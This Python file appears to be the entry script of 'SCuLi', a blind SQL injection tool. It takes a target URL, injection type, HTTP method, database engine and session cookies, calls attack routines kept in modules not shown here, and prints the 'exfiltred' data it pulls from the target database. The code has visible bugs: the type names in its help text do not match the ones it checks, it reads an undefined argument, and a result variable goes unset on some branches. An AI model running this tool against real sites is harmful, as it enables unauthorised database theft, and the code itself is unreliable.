import code.utils as utils
import code.head as head
import argparse
import requests


# toilet -f mono12 SCuLi
SCuLi = '''
   ▄▄▄▄       ▄▄▄▄             ▄▄           ██
 ▄█▀▀▀▀█    ██▀▀▀▀█            ██           ▀▀
 ██▄       ██▀       ██    ██  ██         ████
  ▀████▄   ██        ██    ██  ██           ██
      ▀██  ██▄       ██    ██  ██           ██
 █▄▄▄▄▄█▀   ██▄▄▄▄█  ██▄▄▄███  ██▄▄▄▄▄▄  ▄▄▄██▄▄▄
  ▀▀▀▀▀       ▀▀▀▀    ▀▀▀▀ ▀▀  ▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀
         Ａ tｏοl ｆοｒ SCｕLi loｖeｒs <3
'''

# ALPHABET IN ./code/utils.py

parser = argparse.ArgumentParser(prog='SCuLi', description="A blind SQL Injector.", epilog="Don't hack good people pls.")
parser.add_argument("URL")
parser.add_argument("type", help="Can be: basic, error, xtime, xOAST, xcustom")
parser.add_argument("method", help="Can be: GET or POST")
parser.add_argument("engine", help="Can be: 'Oracle', 'Microsoft', 'PostGre', 'MySQL', 'SQLite'")
parser.add_argument("-d", "--delay", help="In seconds. Example: `0.5`")
parser.add_argument("-c", "--custom", help="Dict format. Example: `{'id': '<>', 'lang': 'fr'}` [Not implemented]")
parser.add_argument("--cookie", help="Example: `PHPSESSID=JWT; csrf=MD5-STUFF`")
parser.add_argument("--proxy", help="Example: `http://127.0.0.1:8080`")
parser.add_argument("-i", "--input", help="Example: `./example_input.json`")
utils.ARGS = parser.parse_args()


if __name__ == '__main__':
    args = utils.ARGS
    print(SCuLi)

    if not utils.check_args(args=args):
        print("[error] Invalid arguments.")
        exit(1)

    URL = args.URL
    TYPE = args.type.lower()
    METHOD = args.method.upper()
    ENGINE = args.engine.lower()
    COOKIES = args.cookie

    if METHOD == "GET":
        with requests.get(URL, cookies=COOKIES) as response:
            if response.status_code in range(404, 499):
                print(f"[error] Unable to connect to {URL} => HTTP status = {response.status_code}")
                exit(1)
    elif METHOD == "POST":
        with requests.post(URL, cookies=COOKIES, data="ABCD=EFGH") as response:
            if response.status_code in range(404, 499):
                print(f"[error] Unable to connect to {URL} => HTTP status = {response.status_code}")
                exit(1)

    try:
        if TYPE in ["basic", "error"]:
            exfiltred_data = head.process_basic(URL, METHOD, ENGINE, TYPE)
        elif TYPE == "time":
            (head.process_time(URL, METHOD, ENGINE))
        elif TYPE == "oast":
            (head.process_OAST(URL, METHOD, ENGINE))
        elif TYPE == "custom":
            BODY = args.body
            (head.process_custom(URL, METHOD, BODY, ENGINE))
    except KeyboardInterrupt:
        print("\n[info] Process stopped.")
        exit(0)

    if exfiltred_data:
        print("\n[info] Data was exfiltred sucessfuly !")
        print(f"[info] Exfiltred data: `{exfiltred_data}`")
        print(f"[info] Stats:\n[info]\tRequests: {utils.QUERY_COUNT}\n[info]\tTiming: {utils.TIMING}secs")

    print("[info] Program ended.")
